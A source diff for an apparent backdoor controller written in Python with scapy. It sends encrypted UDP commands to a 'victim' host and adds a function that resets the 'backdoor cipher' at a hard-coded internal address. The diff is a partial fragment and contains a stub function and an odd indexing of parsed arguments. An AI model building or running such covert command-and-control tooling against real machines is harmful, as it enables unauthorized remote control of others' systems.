@@ -3,12 +3,17 @@ from utils.shell import *
 from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
 from utils.encryption import *
 from multiprocessing import Process, SimpleQueue
-from socket import socket, SOCK_DGRAM, AF_INET
+import argparse
+from ipaddress import ip_address, IPv6Address
+from sys import exit
+
+# Command Line Arguments
+parser = argparse.ArgumentParser("./main.py")
+parser.add_argument("dst_host", help="The destination host. IPv4 Only.")
+parser.add_argument("src_host", help="The source host. IPv4 Only.")
+args = parser.parse_args()
 
 queue = SimpleQueue()
-
-# Seeing if this prevents ICMP messages.
-sock = socket(AF_INET, SOCK_DGRAM)
 
 # Initialize the encryption context.
 encryption_handler = StreamEncryption()
@@ -50,6 +55,13 @@ def send_udp(victim_ip: str, data: str):
     pkt[UDP].payload = Raw(encrypted_data)
     # Send the packet.
     send(pkt, verbose=0)
+
+def list_files():
+    pass
+
+def cipher_reset():
+    print("Resetting backdoor cipher...")
+    send_udp("10.0.0.131", CIPHER_RESET)
 
 if __name__ == "__main__":
 
@@ -93,6 +105,8 @@ if __name__ == "__main__":
                 decrypted = encryption_handler.decrypt(encrypted)
                 print(f"Response: {decrypted.decode('utf-8')}")
                 continue
+            if args[0] == CIPHER and args[1] == RESET:
+                cipher_reset()
         else:
             print(f"Command not found: {command}")
     decode_process.kill()
